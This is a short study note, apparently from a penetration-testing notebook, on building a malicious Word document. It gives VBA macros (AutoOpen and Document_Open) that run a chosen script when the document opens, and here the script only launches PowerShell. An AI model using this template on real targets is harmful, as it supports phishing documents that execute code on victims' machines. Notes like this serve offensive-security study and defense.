## Using MACROS

Save the document as a .doc document (Word 97-2003 option)
navigate to macros and use the following code
one for Auto open the document, the other for Opening the document, and last to run the script that you wish the document to run


![[Pasted image 20231009101852.png]]

Sub AutoOpen()

 MyMacro

End Sub

Sub Document_Open()

 MyMacro
 
End Sub

Sub MyMacro()

 CreateObject("Wscript.Shell").Run "powershell"

End Sub ^655ce0